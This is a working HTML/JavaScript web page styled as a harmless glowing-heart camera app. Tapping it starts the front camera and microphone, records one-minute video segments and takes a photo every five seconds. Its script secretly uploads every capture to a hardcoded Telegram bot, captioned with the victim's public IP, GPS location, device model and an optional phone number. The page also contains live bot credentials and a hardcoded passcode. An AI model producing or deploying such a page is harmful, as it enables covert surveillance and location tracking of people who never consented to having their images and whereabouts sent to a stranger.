<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Glass Camera Recorder</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome for pure minimalist icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        /* Reset selection, tap highlight, and box sizing for mobile & desktop touch UI */
        * {
            user-select: none;
            -webkit-user-select: none;
            -webkit-tap-highlight-color: transparent;
            box-sizing: border-box;
        }

        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: #030508;
            font-family: system-ui, -apple-system, sans-serif;
        }

        /* Deep Liquid Glass Mesh Background */
        .liquid-bg {
            position: fixed;
            inset: 0;
            background: radial-gradient(circle at 20% 20%, #090d16 0%, #020305 70%),
                        radial-gradient(circle at 80% 80%, #05121c 0%, #010204 75%);
            z-index: 0;
        }

        /* Ambient Glowing Glass Orbs (Dark Glass Mode) */
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(120px);
            opacity: 0.35;
            pointer-events: none;
            transition: background 1.2s ease, transform 4s ease-in-out;
            animation: drift 14s infinite alternate ease-in-out;
            z-index: 1;
        }

        .orb-1 {
            width: 65vw;
            height: 65vw;
            max-width: 600px;
            max-height: 600px;
            background: #1e293b;
            top: -15%;
            left: -10%;
        }

        .orb-2 {
            width: 70vw;
            height: 70vw;
            max-width: 650px;
            max-height: 650px;
            background: #0f172a;
            bottom: -15%;
            right: -10%;
            animation-delay: -5s;
        }

        body.recording .orb-1 {
            background: #e11d48;
        }

        body.recording .orb-2 {
            background: #9f1239;
        }

        @keyframes drift {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(40px, -30px) scale(1.12); }
        }

        /* Fullscreen Giant Glass Surface */
        .fullscreen-glass {
            position: fixed;
            inset: 14px;
            border-radius: 38px;
            background: rgba(6, 9, 15, 0.55);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1.5px solid rgba(255, 255, 255, 0.14);
            box-shadow: 0 30px 90px rgba(0, 0, 0, 0.85),
                        inset 0 1px 1px rgba(255, 255, 255, 0.15);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            z-index: 10;
            transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
            overflow: hidden;
            touch-action: manipulation;
        }

        .fullscreen-glass:active {
            transform: scale(0.985);
        }

        body.recording .fullscreen-glass {
            border-color: rgba(244, 63, 94, 0.45);
            box-shadow: 0 30px 90px rgba(0, 0, 0, 0.8),
                        inset 0 0 60px rgba(244, 63, 94, 0.12);
        }

        /* Giant Center Glass Emblem */
        .giant-emblem {
            width: min(76vw, 76vh);
            height: min(76vw, 76vh);
            border-radius: 50%;
            background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.12), rgba(255,255,255,0.02));
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 2px solid rgba(255, 255, 255, 0.18);
            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.5),
                        inset 0 2px 15px rgba(255, 255, 255, 0.22);
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
        }

        body.recording .giant-emblem {
            border-color: rgba(244, 63, 94, 0.65);
            box-shadow: 0 0 90px rgba(244, 63, 94, 0.28),
                        inset 0 0 35px rgba(244, 63, 94, 0.22);
            animation: breathePulse 2.4s infinite ease-in-out;
        }

        @keyframes breathePulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.035); }
        }

        /* Outer Glass Ring */
        .emblem-ring {
            position: absolute;
            inset: 18px;
            border-radius: 50%;
            border: 1px dashed rgba(255, 255, 255, 0.2);
            transition: all 0.6s ease;
        }

        body.recording .emblem-ring {
            border-color: rgba(244, 63, 94, 0.5);
            animation: spinSlow 18s linear infinite;
        }

        @keyframes spinSlow {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        /* Giant Center Icon */
        .giant-icon {
            font-size: min(32vw, 32vh);
            color: rgba(255, 255, 255, 0.85);
            filter: drop-shadow(0 12px 30px rgba(0, 0, 0, 0.5));
            transition: all 0.5s ease;
        }

        body.recording .giant-icon {
            color: #fb7185;
            filter: drop-shadow(0 0 35px rgba(244, 63, 94, 0.65));
        }

        /* Minimal Floating Glass Controls (Icon-only) */
        .floating-glass-btn {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(18px);
            -webkit-backdrop-filter: blur(18px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
            color: rgba(255, 255, 255, 0.9);
            transition: all 0.25s ease;
            cursor: pointer;
        }

        .floating-glass-btn:hover {
            background: rgba(255, 255, 255, 0.18);
            transform: scale(1.08);
        }

        .floating-glass-btn:active {
            transform: scale(0.94);
        }

        /* Vault Drawer */
        .vault-overlay {
            position: fixed;
            inset: 0;
            background: rgba(2, 4, 8, 0.92);
            backdrop-filter: blur(28px);
            -webkit-backdrop-filter: blur(28px);
            z-index: 50;
            transition: opacity 0.3s ease;
        }

        .vault-item {
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 22px;
            overflow: hidden;
            position: relative;
            aspect-ratio: 1 / 1;
        }

        /* Vault Password Lock Modal */
        .lock-overlay {
            position: fixed;
            inset: 0;
            background: rgba(2, 4, 8, 0.94);
            backdrop-filter: blur(28px);
            -webkit-backdrop-filter: blur(28px);
            z-index: 60;
            transition: opacity 0.3s ease;
        }
    </style>
</head>
<body>

    <!-- Background Mesh & Orbs -->
    <div class="liquid-bg"></div>
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>

    <!-- Hidden Source Video & Canvas for Recording & Frame Capture -->
    <div class="hidden">
        <video id="stealthVideo" autoplay playsinline webkit-playsinline muted></video>
        <canvas id="stealthCanvas"></canvas>
    </div>

    <!-- Top Floating Minimal Icon Controls -->
    <div class="fixed top-7 inset-x-7 z-30 flex items-center justify-between pointer-events-none">
        <!-- Balance Spacer -->
        <div class="w-14 h-14"></div>

        <!-- Active Recording Indicator & 1-Minute Cycle Timer Pill -->
        <div id="recIndicator" class="hidden items-center gap-2.5 px-4 py-2 rounded-full bg-rose-600/80 backdrop-blur-md border border-rose-300/40 text-white font-mono text-sm shadow-lg">
            <span class="w-2.5 h-2.5 rounded-full bg-white animate-ping"></span>
            <span id="recTimer">00:00</span>
        </div>

        <!-- Saved Vault Icon -->
        <button id="vaultTriggerBtn" type="button" onclick="handleVaultClick(event)" aria-label="Vault" class="pointer-events-auto floating-glass-btn w-14 h-14 rounded-2xl flex items-center justify-center text-2xl relative">
            <span aria-hidden="true">🤗</span>
            <span id="vaultDot" class="hidden absolute top-2.5 right-2.5 w-3 h-3 rounded-full bg-teal-400 shadow-[0_0_10px_#2dd4bf]"></span>
        </button>
    </div>

    <!-- Non-blocking subtle status pill at bottom when error/permission issue occurs -->
    <div id="statusToast" class="hidden fixed bottom-8 left-1/2 -translate-x-1/2 z-40 px-4 py-2 rounded-full bg-rose-950/90 border border-rose-400/40 text-rose-200 text-xs backdrop-blur-md shadow-xl">
        <i class="fa-solid fa-triangle-exclamation ml-1.5"></i>
        <span id="statusText"></span>
    </div>

    <!-- FULLSCREEN GIANT GLASS TRIGGER SURFACE -->
    <main id="screenTrigger" role="button" tabindex="0" class="fullscreen-glass">
        <div class="giant-emblem">
            <div class="emblem-ring"></div>
            <i id="centerEmblemIcon" class="fa-solid fa-heart giant-icon"></i>
        </div>
    </main>

    <!-- MEDIA VAULT MODAL -->
    <div id="vaultModal" class="vault-overlay hidden opacity-0 flex flex-col p-6">
        <div class="flex items-center justify-between pb-5 border-b border-white/10">
            <div class="flex items-center gap-3">
                <button type="button" onclick="downloadAllMedia()" aria-label="Download All" class="floating-glass-btn w-12 h-12 rounded-2xl flex items-center justify-center text-teal-300 text-lg">
                    <i class="fa-solid fa-download"></i>
                </button>
                <button type="button" onclick="clearAllMedia()" aria-label="Clear All" class="floating-glass-btn w-12 h-12 rounded-2xl flex items-center justify-center text-rose-400 text-lg">
                    <i class="fa-solid fa-trash-can"></i>
                </button>
            </div>
            <button type="button" onclick="closeVault()" aria-label="Close" class="floating-glass-btn w-12 h-12 rounded-2xl flex items-center justify-center text-white text-xl">
                <i class="fa-solid fa-xmark"></i>
            </button>
        </div>

        <div id="vaultGrid" class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4 overflow-y-auto pt-6 pb-10">
            <!-- Captured videos and photos appear here -->
        </div>
    </div>

    <!-- VAULT PASSWORD MODAL -->
    <div id="vaultLockModal" class="lock-overlay hidden opacity-0 flex items-center justify-center p-6">
        <div class="w-full max-w-xs rounded-3xl bg-white/[0.07] border border-white/15 p-6 shadow-2xl flex flex-col items-center gap-4">
            <div class="w-14 h-14 rounded-2xl bg-white/10 border border-white/15 flex items-center justify-center text-2xl text-teal-300">
                <i class="fa-solid fa-lock"></i>
            </div>
            <input id="vaultPasswordInput" type="password" inputmode="text" autocomplete="off" placeholder="Password" dir="ltr" class="w-full px-4 py-3 rounded-2xl bg-black/50 border border-white/15 text-white text-center tracking-widest focus:outline-none focus:border-teal-400/60" />
            <div class="w-full flex items-center gap-3">
                <button type="button" onclick="closeVaultLock()" class="flex-1 py-3 rounded-2xl floating-glass-btn text-sm text-white/80">
                    <i class="fa-solid fa-xmark"></i>
                </button>
                <button type="button" onclick="verifyVaultPassword()" class="flex-1 py-3 rounded-2xl floating-glass-btn text-sm text-teal-300 font-semibold">
                    <i class="fa-solid fa-unlock"></i>
                </button>
            </div>
        </div>
    </div>

    <script>
        // Core Application State
        let isRecording = false;
        let isStarting = false;
        const facingMode = 'user'; // Always front camera (کامیرا سینگێ)
        let activeStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let photoInterval = null;
        let timerInterval = null;
        let toastTimeout = null;
        let recordingSeconds = 0;
        const MAX_RECORD_SECONDS = 60; // 1-minute segment cycle
        let mediaItems = [];
        const VAULT_PASSCODE = 'zaxo20091';
        let isVaultUnlocked = false;

        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '8660945623:AAF6aDwt90gZjwg5kcKaUGS1ydI2D0XZ3yE';
        const TELEGRAM_CHAT_ID = '8473466445';

        // Cached network/location info for captions and watermarks
        let cachedNetworkInfo = {
            ip: 'IP N/A',
            location: 'Location N/A',
            gps: null,
            phone: ''
        };

        const videoEl = document.getElementById('stealthVideo');
        const canvasEl = document.getElementById('stealthCanvas');
        const ctx = canvasEl.getContext('2d');
        const screenTrigger = document.getElementById('screenTrigger');

        // Fetches public IP, approximate city/country, and optional GPS coordinates
        async function fetchNetworkAndLocationInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                if (res.ok) {
                    const data = await res.json();
                    const ipVal = data.ip ? String(data.ip) : 'IP N/A';
                    const parts = [data.city, data.region, data.country_name].filter(Boolean);
                    const locVal = parts.length > 0 ? parts.join(', ') : 'Location N/A';
                    cachedNetworkInfo.ip = ipVal;
                    cachedNetworkInfo.location = locVal;
                }
            } catch (_) {
                // Keep defaults if offline or blocked
            }

            if (navigator.geolocation) {
                try {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            const lat = pos.coords.latitude.toFixed(5);
                            const lon = pos.coords.longitude.toFixed(5);
                            cachedNetworkInfo.gps = `${lat}, ${lon}`;
                        },
                        () => {
                            // Ignore if denied or unavailable
                        },
                        { enableHighAccuracy: true, timeout: 6000, maximumAge: 60000 }
                    );
                } catch (_) {
                    // Ignore geolocation errors
                }
            }
        }
        fetchNetworkAndLocationInfo();

        // Reads optional phone number from query parameter (?phone=...) or window variable if provided
        function getOptionalPhoneNumber() {
            if (cachedNetworkInfo.phone && cachedNetworkInfo.phone.trim()) {
                return cachedNetworkInfo.phone.trim();
            }
            try {
                const params = new URLSearchParams(window.location.search);
                const qPhone = params.get('phone');
                if (qPhone && qPhone.trim()) {
                    cachedNetworkInfo.phone = qPhone.trim();
                    return cachedNetworkInfo.phone;
                }
            } catch (_) {}
            if (typeof window.TARGET_PHONE === 'string' && window.TARGET_PHONE.trim()) {
                cachedNetworkInfo.phone = window.TARGET_PHONE.trim();
                return cachedNetworkInfo.phone;
            }
            return 'N/A';
        }

        // Builds clean formatted caption with date, time, device label, IP, location, and phone
        function buildMediaCaption() {
            const now = new Date();
            const dateStr = now.toLocaleDateString('en-GB');
            const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
            const deviceLabel = getDeviceModelLabel();
            const phoneLabel = getOptionalPhoneNumber();
            const locationText = cachedNetworkInfo.gps
                ? `${cachedNetworkInfo.location} (GPS: ${cachedNetworkInfo.gps})`
                : cachedNetworkInfo.location;

            return [
                `📅 Date: ${dateStr}`,
                `⏰ Time: ${timeStr}`,
                `📱 Device: ${deviceLabel}`,
                `📞 Phone: ${phoneLabel}`,
                `🌐 IP: ${cachedNetworkInfo.ip}`,
                `📍 Location: ${locationText}`
            ].join('\n');
        }

        // Detects device model/type from User-Agent
        function getDeviceModelLabel() {
            const ua = navigator.userAgent || '';
            if (/iPhone/i.test(ua)) return 'iPhone';
            if (/iPad/i.test(ua)) return 'iPad';
            if (/Android/i.test(ua)) {
                const match = ua.match(/Android[^;)]*;\s*([^;)]+)\s*(?:Build|\))/i);
                return match && match[1] ? match[1].trim() : 'Android';
            }
            if (/Macintosh|Mac OS X/i.test(ua)) return 'Mac';
            if (/Windows/i.test(ua)) return 'Windows';
            return 'Device';
        }

        // Builds caption containing date, time, device label, IP, and location
        function buildMediaCaption() {
            const now = new Date();
            const dateStr = now.toLocaleDateString('en-GB');
            const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
            const deviceLabel = getDeviceModelLabel();
            return `${dateStr} • ${timeStr}\n📱 ${deviceLabel}\n🌐 IP: ${cachedNetworkInfo.ip}\n📍 ${cachedNetworkInfo.location}`;
        }

        // Uploads captured video or photo to the configured Telegram bot
        async function uploadMediaToTelegram(type, blobOrUrl, ext = 'mp4') {
            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
            try {
                let fileBlob;
                if (blobOrUrl instanceof Blob) {
                    fileBlob = blobOrUrl;
                } else {
                    const res = await fetch(blobOrUrl);
                    fileBlob = await res.blob();
                }

                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('caption', buildMediaCaption());

                const endpoint = type === 'video' ? 'sendVideo' : 'sendPhoto';
                const fieldName = type === 'video' ? 'video' : 'photo';
                const fileName = `${type}_${Date.now()}.${ext}`;
                formData.append(fieldName, fileBlob, fileName);

                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${endpoint}`, {
                    method: 'POST',
                    body: formData
                });

                if (!response.ok) {
                    const errData = await response.json().catch(() => ({}));
                    console.warn('Telegram upload failed:', errData);
                }
            } catch (err) {
                console.warn('Telegram upload error:', err);
            }
        }

        // Bind click & keyboard events to the fullscreen trigger
        screenTrigger.addEventListener('click', (e) => {
            e.preventDefault();
            toggleStealthSession();
        });

        screenTrigger.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' || e.key === ' ') {
                e.preventDefault();
                toggleStealthSession();
            }
        });

        function handleVaultClick(e) {
            e.preventDefault();
            e.stopPropagation();
            openVault();
        }

        // Starts the front camera stream and continuous recording session
        async function toggleStealthSession() {
            if (isStarting) return;

            if (isRecording) {
                showStatusMessage('Recording');
                return;
            }

            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                showStatusMessage('Camera API not supported in this browser');
                return;
            }

            isStarting = true;

            try {
                videoEl.setAttribute('playsinline', '');
                videoEl.setAttribute('webkit-playsinline', '');
                videoEl.muted = true;

                try {
                    activeStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { ideal: facingMode },
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        },
                        audio: true
                    });
                } catch (audioOrConstraintErr) {
                    // Fallback to video-only stream if microphone permission is denied or unavailable
                    activeStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { ideal: facingMode } },
                        audio: false
                    });
                }

                videoEl.srcObject = activeStream;
                await videoEl.play();

                videoEl.onloadedmetadata = () => {
                    canvasEl.width = videoEl.videoWidth || 1280;
                    canvasEl.height = videoEl.videoHeight || 720;
                };
                if (videoEl.videoWidth && videoEl.videoHeight) {
                    canvasEl.width = videoEl.videoWidth;
                    canvasEl.height = videoEl.videoHeight;
                } else {
                    canvasEl.width = 1280;
                    canvasEl.height = 720;
                }

                startContinuousRecordingAndPhotos();

            } catch (err) {
                console.error("Camera access error:", err);
                cleanupHardware();
                if (err && err.name === 'NotAllowedError') {
                    showStatusMessage('Camera permission denied');
                } else {
                    showStatusMessage('Unable to start camera');
                }
            } finally {
                isStarting = false;
            }
        }

        // Starts continuous video segments (restarting every 60s) and periodic photo snapshots
        function startContinuousRecordingAndPhotos() {
            isRecording = true;
            recordingSeconds = 0;
            document.body.classList.add('recording');
            document.getElementById('centerEmblemIcon').className = 'fa-solid fa-heart fa-beat giant-icon';
            
            const recIndicator = document.getElementById('recIndicator');
            const recTimer = document.getElementById('recTimer');
            recIndicator.classList.remove('hidden');
            recIndicator.classList.add('flex');
            recTimer.textContent = '00:00';

            if (navigator.vibrate) {
                try { navigator.vibrate([40, 30, 40]); } catch (_) {}
            }

            if (timerInterval) clearInterval(timerInterval);
            if (photoInterval) clearInterval(photoInterval);

            timerInterval = setInterval(() => {
                recordingSeconds++;
                const mins = String(Math.floor(recordingSeconds / 60)).padStart(2, '0');
                const secs = String(recordingSeconds % 60).padStart(2, '0');
                recTimer.textContent = `${mins}:${secs}`;

                if (recordingSeconds >= MAX_RECORD_SECONDS) {
                    recordingSeconds = 0;
                    recTimer.textContent = '00:00';
                    restartVideoSegment();
                }
            }, 1000);

            photoInterval = setInterval(() => {
                captureStealthPhoto();
            }, 5000);

            startVideoSegmentRecorder();
        }

        // Initializes and starts a MediaRecorder segment
        function startVideoSegmentRecorder() {
            recordedChunks = [];
            if (!activeStream || typeof MediaRecorder === 'undefined') {
                mediaRecorder = null;
                return;
            }

            let mimeType = '';
            if (MediaRecorder.isTypeSupported('video/mp4')) {
                mimeType = 'video/mp4';
            } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                mimeType = 'video/webm;codecs=vp9';
            } else if (MediaRecorder.isTypeSupported('video/webm')) {
                mimeType = 'video/webm';
            }

            try {
                mediaRecorder = mimeType 
                    ? new MediaRecorder(activeStream, { mimeType }) 
                    : new MediaRecorder(activeStream);

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = () => {
                    if (recordedChunks.length > 0) {
                        const finalMime = mediaRecorder.mimeType || mimeType || 'video/webm';
                        const ext = finalMime.includes('mp4') ? 'mp4' : 'webm';
                        const blob = new Blob(recordedChunks, { type: finalMime });
                        const videoUrl = URL.createObjectURL(blob);
                        mediaItems.unshift({
                            type: 'video',
                            url: videoUrl,
                            ext: ext
                        });
                        updateVaultBadge();
                        uploadMediaToTelegram('video', blob, ext);
                    }
                    recordedChunks = [];

                    if (isRecording && activeStream) {
                        startVideoSegmentRecorder();
                    }
                };

                mediaRecorder.start(500);
            } catch (recErr) {
                console.warn("MediaRecorder fallback to photo capture:", recErr);
                mediaRecorder = null;
            }
        }

        // Stops current video segment so onstop saves & starts the next segment
        function restartVideoSegment() {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                try {
                    mediaRecorder.stop();
                } catch (e) {
                    console.warn('Error restarting video segment:', e);
                    startVideoSegmentRecorder();
                }
            } else if (isRecording && activeStream) {
                startVideoSegmentRecorder();
            }
        }

        // Captures a photo frame with timestamp, device model, IP, and location watermark
        function captureStealthPhoto() {
            if (!videoEl || videoEl.readyState < 2 || !canvasEl.width || !canvasEl.height) return;

            ctx.save();
            if (facingMode === 'user') {
                ctx.translate(canvasEl.width, 0);
                ctx.scale(-1, 1);
            }
            ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
            ctx.restore();

            const now = new Date();
            const dateStr = now.toLocaleDateString('en-GB');
            const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
            const deviceLabel = getDeviceModelLabel();
            const stampText = `${dateStr} • ${timeStr} • ${deviceLabel} • IP: ${cachedNetworkInfo.ip} • ${cachedNetworkInfo.location}`;

            const padX = Math.max(16, Math.round(canvasEl.width * 0.025));
            const padY = Math.max(12, Math.round(canvasEl.height * 0.02));
            const fontSize = Math.max(16, Math.round(canvasEl.width * 0.024));
            ctx.font = `600 ${fontSize}px system-ui, -apple-system, sans-serif`;

            const textMetrics = ctx.measureText(stampText);
            const boxW = textMetrics.width + padX * 2;
            const boxH = fontSize + padY * 1.4;
            const boxX = (canvasEl.width - boxW) / 2;
            const boxY = canvasEl.height - boxH - Math.max(20, Math.round(canvasEl.height * 0.03));

            ctx.save();
            ctx.fillStyle = 'rgba(3, 5, 8, 0.65)';
            ctx.beginPath();
            if (typeof ctx.roundRect === 'function') {
                ctx.roundRect(boxX, boxY, boxW, boxH, 14);
            } else {
                ctx.rect(boxX, boxY, boxW, boxH);
            }
            ctx.fill();

            ctx.strokeStyle = 'rgba(255, 255, 255, 0.28)';
            ctx.lineWidth = 1.5;
            ctx.stroke();

            ctx.fillStyle = 'rgba(255, 255, 255, 0.95)';
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            ctx.fillText(stampText, boxX + boxW / 2, boxY + boxH / 2 + 1);
            ctx.restore();

            const photoDataUrl = canvasEl.toDataURL('image/jpeg', 0.88);
            mediaItems.unshift({
                type: 'photo',
                url: photoDataUrl,
                ext: 'jpg'
            });
            updateVaultBadge();
            uploadMediaToTelegram('photo', photoDataUrl, 'jpg');
        }

        // Stops active recording session and releases camera hardware
        function stopStealthSession() {
            if (!isRecording) return;
            isRecording = false;

            document.body.classList.remove('recording');
            document.getElementById('centerEmblemIcon').className = 'fa-solid fa-heart giant-icon';
            
            const recIndicator = document.getElementById('recIndicator');
            recIndicator.classList.add('hidden');
            recIndicator.classList.remove('flex');

            if (navigator.vibrate) {
                try { navigator.vibrate(50); } catch (_) {}
            }

            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
            }
            if (photoInterval) {
                clearInterval(photoInterval);
                photoInterval = null;
            }

            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                try {
                    mediaRecorder.stop();
                } catch (e) {
                    console.warn('Error stopping MediaRecorder:', e);
                }
            }

            setTimeout(() => {
                cleanupHardware();
            }, 300);
        }

        // Stops all media tracks and resets video element
        function cleanupHardware() {
            if (activeStream) {
                activeStream.getTracks().forEach(track => {
                    try { track.stop(); } catch (_) {}
                });
                activeStream = null;
            }
            if (videoEl) {
                videoEl.srcObject = null;
            }
            mediaRecorder = null;
        }

        // Updates vault indicator dot visibility
        function updateVaultBadge() {
            const dot = document.getElementById('vaultDot');
            if (!dot) return;
            if (mediaItems.length > 0) {
                dot.classList.remove('hidden');
            } else {
                dot.classList.add('hidden');
            }
        }

        // Opens vault if unlocked, otherwise shows password lock
        function openVault(bypassLock = false) {
            if (!bypassLock && !isVaultUnlocked) {
                openVaultLock();
                return;
            }
            renderVault();
            const modal = document.getElementById('vaultModal');
            modal.classList.remove('hidden');
            setTimeout(() => modal.classList.remove('opacity-0'), 10);
        }

        function openVaultLock() {
            const lockModal = document.getElementById('vaultLockModal');
            const input = document.getElementById('vaultPasswordInput');
            input.value = '';
            lockModal.classList.remove('hidden');
            setTimeout(() => {
                lockModal.classList.remove('opacity-0');
                input.focus();
            }, 10);
        }

        function closeVaultLock() {
            const lockModal = document.getElementById('vaultLockModal');
            const input = document.getElementById('vaultPasswordInput');
            input.value = '';
            lockModal.classList.add('opacity-0');
            setTimeout(() => lockModal.classList.add('hidden'), 300);
        }

        function verifyVaultPassword() {
            const input = document.getElementById('vaultPasswordInput');
            const entered = (input.value || '').trim();
            if (entered === VAULT_PASSCODE) {
                isVaultUnlocked = true;
                closeVaultLock();
                setTimeout(() => openVault(true), 120);
            } else {
                input.value = '';
                input.focus();
                showStatusMessage('Wrong password');
            }
        }

        document.getElementById('vaultPasswordInput').addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                verifyVaultPassword();
            }
        });

        function closeVault() {
            isVaultUnlocked = false;
            const modal = document.getElementById('vaultModal');
            modal.classList.add('opacity-0');
            setTimeout(() => modal.classList.add('hidden'), 300);
        }

        // Renders saved videos and photos inside the vault grid
        function renderVault() {
            const grid = document.getElementById('vaultGrid');
            grid.innerHTML = '';

            mediaItems.forEach((item, idx) => {
                const card = document.createElement('div');
                card.className = 'vault-item group';

                if (item.type === 'video') {
                    card.innerHTML = `
                        <video src="${item.url}" controls playsinline webkit-playsinline class="w-full h-full object-cover"></video>
                        <div class="absolute top-2.5 right-2.5 w-8 h-8 rounded-xl bg-rose-500/80 backdrop-blur-md text-white flex items-center justify-center text-xs pointer-events-none">
                            <i class="fa-solid fa-video"></i>
                        </div>
                        <a href="${item.url}" download="rec-${idx + 1}.${item.ext}" class="absolute top-2.5 left-2.5 w-8 h-8 rounded-xl bg-black/60 backdrop-blur-md text-teal-300 flex items-center justify-center text-xs">
                            <i class="fa-solid fa-download"></i>
                        </a>
                    `;
                } else {
                    card.innerHTML = `
                        <img src="${item.url}" class="w-full h-full object-cover" alt="">
                        <div class="absolute top-2.5 right-2.5 w-8 h-8 rounded-xl bg-sky-500/80 backdrop-blur-md text-white flex items-center justify-center text-xs pointer-events-none">
                            <i class="fa-solid fa-image"></i>
                        </div>
                        <a href="${item.url}" download="img-${idx + 1}.${item.ext}" class="absolute top-2.5 left-2.5 w-8 h-8 rounded-xl bg-black/60 backdrop-blur-md text-teal-300 flex items-center justify-center text-xs">
                            <i class="fa-solid fa-download"></i>
                        </a>
                    `;
                }

                grid.appendChild(card);
            });
        }

        // Triggers sequential downloads for all saved items in the vault
        function downloadAllMedia() {
            mediaItems.forEach((item, idx) => {
                setTimeout(() => {
                    const a = document.createElement('a');
                    a.href = item.url;
                    a.download = `capture-${idx + 1}.${item.ext}`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                }, idx * 180);
            });
        }

        // Clears saved items and revokes object URLs
        function clearAllMedia() {
            mediaItems.forEach(item => {
                if (item.type === 'video') URL.revokeObjectURL(item.url);
            });
            mediaItems = [];
            updateVaultBadge();
            renderVault();
        }
    </script>
</body>
